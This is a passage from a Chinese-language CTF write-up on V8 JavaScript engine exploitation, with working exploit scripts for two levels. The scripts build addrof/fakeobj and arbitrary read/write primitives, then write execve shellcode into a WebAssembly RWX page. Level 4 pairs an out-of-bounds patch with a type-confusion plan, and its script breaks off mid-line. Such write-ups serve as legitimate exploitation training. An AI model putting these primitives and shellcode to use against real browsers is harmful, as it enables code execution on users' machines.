<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">let</span> uv = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(ab);</span><br><span class="line"><span class="keyword">let</span> dv = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(ab);</span><br><span class="line"><span class="keyword">let</span> fv = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>) &#123;</span><br><span class="line">    fv[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> dv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f</span>(<span class="params">i</span>) &#123;</span><br><span class="line">    dv[<span class="number">0</span>] = <span class="title class_">BigInt</span>(i);</span><br><span class="line">    <span class="keyword">return</span> fv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2f</span>(<span class="params">i, j</span>)&#123;</span><br><span class="line">    uv[<span class="number">0</span>]=i;</span><br><span class="line">    uv[<span class="number">1</span>]=j;</span><br><span class="line">    <span class="keyword">return</span> fv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shift32</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> i&lt;&lt;<span class="number">32n</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> fake = [<span class="title function_">i2f</span>(<span class="number">0x31040404001c0261n</span>), <span class="title function_">i2f</span>(<span class="number">0x0a0007ff11000844n</span>)]; <span class="comment">//fake a map</span></span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(arr);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(fake);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;&#125;;</span><br></pre></td></tr></table></figure>
<p>element 的部分： Offset -0x20<br><img src="https://hackmd.io/_uploads/B1SCstcJle.png" alt="image">  </p>
<p>Map 的部分，剛剛的 fake 就是透過 floats 偽造了一個 Map 的資料格式進去<br><img src="https://hackmd.io/_uploads/B1ZDit9Jxl.png" alt="image"><br>+24 的地方就有我們要的東西！  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fake_obj = <span class="title class_">GetFakeObject</span>(<span class="title class_">GetAddressOf</span>(fake_array)+<span class="variable constant_">MAP_OFFSET</span>);</span><br><span class="line"><span class="comment">//console.log(arr_element_addr.toString(16));</span></span><br><span class="line"><span class="comment">//console.log(fake_map_addr.toString(16));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ArbRead64</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">    fake_array[<span class="number">1</span>] = <span class="title function_">u2f</span>(addr+<span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">f2i</span>(fake_obj[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ArbWrite64</span>(<span class="params">addr, value</span>)&#123;</span><br><span class="line">    fake_array[<span class="number">1</span>] = <span class="title function_">u2f</span>(addr+<span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line">    fake_obj[<span class="number">0</span>] = <span class="title function_">i2f</span>(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最後 DebugPrint 看看 fake, arr 的地址和 fake_obj 就有ㄌ，+24 就是為了把剛剛寫進 fake_arr 的兩個變數重新當新的 map 和 elements 那些 metadata  </p>
<p>後面就跟前面一樣，永無止盡的算 offset，不過小技巧一樣是先寫個無害的東西方便 debug 後再算 offset，會簡單許多w<br>P.S. 我不確定為什麼 OOB 的時候地址都會多 8，反正扣回去就行了 :P<br><strong>sol.js</strong>  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">let</span> uv = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(ab);</span><br><span class="line"><span class="keyword">let</span> dv = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(ab);</span><br><span class="line"><span class="keyword">let</span> fv = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>) &#123;</span><br><span class="line">    fv[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> dv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f</span>(<span class="params">i</span>) &#123;</span><br><span class="line">    dv[<span class="number">0</span>] = <span class="title class_">BigInt</span>(i);</span><br><span class="line">    <span class="keyword">return</span> fv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2f</span>(<span class="params">i, j</span>)&#123;</span><br><span class="line">    uv[<span class="number">0</span>]=i;</span><br><span class="line">    uv[<span class="number">1</span>]=j;</span><br><span class="line">    <span class="keyword">return</span> fv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shift32</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> i&lt;&lt;<span class="number">32n</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> fake = [<span class="title function_">i2f</span>(<span class="number">0x31040404001c0261n</span>), <span class="title function_">i2f</span>(<span class="number">0x0a0007ff11000844n</span>)]; <span class="comment">//fake a map</span></span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">ELEMENT_OFFSET</span> = <span class="number">0x20</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">MAP_OFFSET</span> = <span class="number">0x24</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">WASM_PAGE_SIZE</span> = <span class="number">0x2c100</span>;</span><br><span class="line"><span class="comment">//console.log(GetAddressOf(arr).toString(16));</span></span><br><span class="line"><span class="comment">//console.log(GetAddressOf(fake_map).toString(16));</span></span><br><span class="line">arr_element_addr = <span class="title class_">GetAddressOf</span>(arr)-<span class="variable constant_">ELEMENT_OFFSET</span>; <span class="comment">//element</span></span><br><span class="line">fake_map_addr = <span class="title class_">GetAddressOf</span>(fake)+<span class="variable constant_">MAP_OFFSET</span>; <span class="comment">//map</span></span><br><span class="line">fake_array = [<span class="title function_">u2f</span>(fake_map_addr+<span class="number">1</span>, <span class="number">0</span>), <span class="title function_">u2f</span>(arr_element_addr+<span class="number">1</span>, <span class="number">100</span>)]; <span class="comment">//map, properties, elements, len</span></span><br><span class="line">fake_obj = <span class="title class_">GetFakeObject</span>(<span class="title class_">GetAddressOf</span>(fake_array)+<span class="variable constant_">MAP_OFFSET</span>);</span><br><span class="line"><span class="comment">//console.log(arr_element_addr.toString(16));</span></span><br><span class="line"><span class="comment">//console.log(fake_map_addr.toString(16));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ArbRead64</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">    fake_array[<span class="number">1</span>] = <span class="title function_">u2f</span>(addr+<span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">f2i</span>(fake_obj[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ArbWrite64</span>(<span class="params">addr, value</span>)&#123;</span><br><span class="line">    fake_array[<span class="number">1</span>] = <span class="title function_">u2f</span>(addr+<span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line">    fake_obj[<span class="number">0</span>] = <span class="title function_">i2f</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//console.log(ArbRead64(arr_element_addr).toString(16));</span></span><br><span class="line"><span class="comment">//ArbWrite64(arr_element_addr, 1);</span></span><br><span class="line"><span class="comment">//console.log(ArbRead64(arr_element_addr).toString(16));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_mod);</span><br><span class="line"><span class="keyword">var</span> f = wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> shellcode = [<span class="title function_">i2f</span>(<span class="number">0x9090909090909090n</span>),<span class="title function_">i2f</span>(<span class="number">0x2434810101666068n</span>),<span class="title function_">i2f</span>(<span class="number">0x6567b84801010101n</span>),<span class="title function_">i2f</span>(<span class="number">0x48506c667461632fn</span>),<span class="title function_">i2f</span>(<span class="number">0x656c6c6168632fb8n</span>),<span class="title function_">i2f</span>(<span class="number">0x31d231e78948506en</span>),<span class="title function_">i2f</span>(<span class="number">0x0000050f583b6af6n</span>)];</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = <span class="title class_">ArbRead64</span>(<span class="title class_">GetAddressOf</span>(wasm_instance)+<span class="variable constant_">WASM_PAGE_SIZE</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">GetAddressOf</span>(wasm_instance).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//console.log(GetAddressOf(fake).toString(16));</span></span><br><span class="line"><span class="comment">//console.log(GetAddressOf(arr).toString(16));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(shellcode.<span class="property">length</span> * <span class="number">8</span>);</span><br><span class="line"><span class="keyword">let</span> dataview = <span class="keyword">new</span> <span class="title class_">DataView</span>(buf);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// move dataview to RWX memory</span></span><br><span class="line"><span class="keyword">let</span> buf_addr = <span class="title class_">GetAddressOf</span>(buf);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(buf_addr);</span><br><span class="line"><span class="keyword">let</span> backing_store_pointer = buf_addr + <span class="number">0x1c</span>;</span><br><span class="line">backing_store_addr = <span class="title class_">ArbRead64</span>(backing_store_pointer);</span><br><span class="line"><span class="comment">//caculate full rwx addr</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(rwx_page_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(backing_store_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//ArbWrite64(backing_store_pointer, backing_store_addr);</span></span><br><span class="line"><span class="title class_">ArbWrite64</span>(backing_store_pointer,rwx_page_addr);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">ArbRead64</span>(backing_store_pointer).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//%DebugPrint(buf);</span></span><br><span class="line"><span class="comment">//%DebugPrint(wasm_instance);</span></span><br><span class="line"><span class="comment">//%DebugPrint(arr);</span></span><br><span class="line"><span class="comment">//%DebugPrint(fake);</span></span><br><span class="line"><span class="comment">//%DebugPrint(fake_obj);</span></span><br><span class="line"><span class="comment">// copy shellcode</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    dataview.<span class="title function_">setFloat64</span>(<span class="number">8</span> * i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// jump to RWX memory</span></span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line"><span class="comment">//console.log(ArbRead64(arr_element_addr).toString(16));</span></span><br><span class="line"><span class="comment">//ArbWrite64(arr_element_addr, 1);</span></span><br><span class="line"><span class="comment">//console.log(ArbRead64(arr_element_addr).toString(16));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><p>只給了一個 array 任意設置 length prototype<br>跟這題有 87% 相似（<br><a target="_blank" rel="noopener" href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/">https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/</a>  </p>
<p><strong>patch</strong>  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">--- /dev/null</span><br><span class="line">+++ b/src/builtins/<span class="built_in">array</span>-setlength.tq</span><br><span class="line">@@ <span class="number">-0</span>,<span class="number">0</span> +<span class="number">1</span>,<span class="number">14</span> @@</span><br><span class="line">+namespace <span class="built_in">array</span> &#123;</span><br><span class="line">+transitioning javascript builtin</span><br><span class="line">+ArrayPrototypeSetLength(</span><br><span class="line">+  js-implicit context: NativeContext, receiver: JSAny)(length: JSAny): JSAny &#123;</span><br><span class="line">+    try &#123;</span><br><span class="line">+      <span class="type">const</span> len: Smi = Cast&lt;Smi&gt;(length) otherwise ErrorLabel;</span><br><span class="line">+      <span class="type">const</span> <span class="built_in">array</span>: JSArray = Cast&lt;JSArray&gt;(receiver) otherwise ErrorLabel;</span><br><span class="line">+      <span class="built_in">array</span>.length = len;</span><br><span class="line">+    &#125; label ErrorLabel &#123;</span><br><span class="line">+        Print(<span class="string">&quot;Nope&quot;</span>);</span><br><span class="line">+    &#125;</span><br><span class="line">+    <span class="keyword">return</span> receiver;</span><br><span class="line">+&#125;</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure>
<p>調用方法是 <code>a.setLength</code> 這樣的 prototype function  </p>
<p>利用想法就是先從這個 setLength 拿到有限制的 oob 透過更改 map 達成 type confusion，完成 read_addr 和 fakeobject 兩個功能，後面就跟 level3 一樣了<br>首先來觀察兩種物件的 element 結構：<br>觀察：<code>Array(float)</code><br>float array 的結構中，element addr + 8 就直接儲存了 index 0 的資料<br><img src="https://hackmd.io/_uploads/SybJUfo1eg.png" alt="image">  </p>
<p><img src="https://hackmd.io/_uploads/S1jE8fokgx.png" alt="image">  </p>
<p>觀察：<code>Array(Object)</code><br>Object array 裡面，element + 8 的地方會先去存取壓縮後的 Object 地址<br><img src="https://hackmd.io/_uploads/H1qmEzokel.png" alt="image">  </p>
<p><img src="https://hackmd.io/_uploads/BJCd4Gjkeg.png" alt="image">  </p>
<p><img src="https://hackmd.io/_uploads/H1fR4MsJee.png" alt="image">  </p>
<p>另外可以注意到 MapAddress 都在 elements 最後一項之後，那為什麼 Map 那麼重要呢，回顧一下會知道 Map 對於 V8 而言相當於告訴它這是哪種變數，所以如果能透過 oob 控制 Map 就相當於可以打出 Type Confusion!  </p>
<p>然後，直接去讀 <code>[&#123;&quot;meow&quot;:1234&#125;]</code> 的 oob 會發現噴錯，因為技術上它依然是個 Object Array，但資料格式明顯不對，所以我改成用 <code>[&#123;trojan_arr:[1.1, 1.1 ....]&#125;]</code> 的方法，再透過內部的 trojan_arr 往外戳找 offset 讀取包含 Object Array 的 Map 地址  </p>
<p>要利用 float array 去 oob，就把 pwndbg 追進去算 offset，在我的 case 中 0x17 可以看到 Object 的 Map Address (壓縮過的)<br><img src="https://hackmd.io/_uploads/B1MDeXikge.png" alt="image">  </p>
<p>接下來就是利用的重點，取得地址的方法是上面提到的，Float Elements 內部 +8 的位置就是第一個元素了，而對於儲存 Object 的 Array 則會是 Object 地址，那就進行一次 Type Confusion，把 Object Array 變成 Float Array 再去讀取 index&#x3D;0 (element+8) 的內容就有 Address 了，Fake Object 則是反過來操作！  </p>
<p>最後既然有了地址洩漏&#x2F;FakeObject，就可以跟 Level 3 的流程做一樣的攻擊了。  </p>
<p><strong>sol.js</strong>  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">let</span> uv = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(ab);</span><br><span class="line"><span class="keyword">let</span> dv = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(ab);</span><br><span class="line"><span class="keyword">let</span> fv = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>) &#123;</span><br><span class="line">    fv[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> dv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f</span>(<span class="params">i</span>) &#123;</span><br><span class="line">    dv[<span class="number">0</span>] = <span class="title class_">BigInt</span>(i);</span><br><span class="line">    <span class="keyword">return</span> fv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2f</span>(<span class="params">i, j</span>)&#123;</span><br><span class="line">    uv[<span class="number">0</span>]=i;</span><br><span class="line">    uv[<span class="number">1</span>]=j;</span><br><span class="line">    <span class="keyword">return</span> fv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2ul</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    fv[<span class="number">0</span>]=i;</span><br><span class="line">    <span class="keyword">return</span> uv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2uh</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    fv[<span class="number">0</span>]=i;</span><br><span class="line">    <span class="keyword">return</span> uv[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shift32</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> i&lt;&lt;<span class="number">32n</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">last32</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    dv[<span class="number">0</span>]=i;</span><br><span class="line">    <span class="keyword">return</span> uv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> trojan_arr = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x10</span>).<span class="title function_">fill</span>(<span class="number">1.1</span>);</span><br><span class="line"><span class="keyword">let</span> sample_obj = &#123;trojan_arr&#125;;</span><br><span class="line"><span class="keyword">let</span> obj_arr = [sample_obj];</span><br><span class="line"><span class="keyword">let</span> float_arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">trojan_arr.<span class="title function_">setLength</span>(<span class="number">0x20</span>);</span><br><span class="line">float_arr.<span class="title function_">setLength</span>(<span class="number">4</span>);</span><br><span class="line">obj_arr_map_addr = <span class="title function_">f2ul</span>(trojan_arr[<span class="number">0x17</span>])-<span class="number">1</span>;</span><br><span class="line">obj_arr_prototype = <span class="title function_">f2uh</span>(trojan_arr[<span class="number">0x17</span>]);</span><br><span class="line">float_arr_map_addr = <span class="title function_">f2ul</span>(float_arr[<span class="number">0x3</span>])-<span class="number">1</span>;</span><br><span class="line">float_arr_prototype = <span class="title function_">f2uh</span>(float_arr[<span class="number">0x3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title 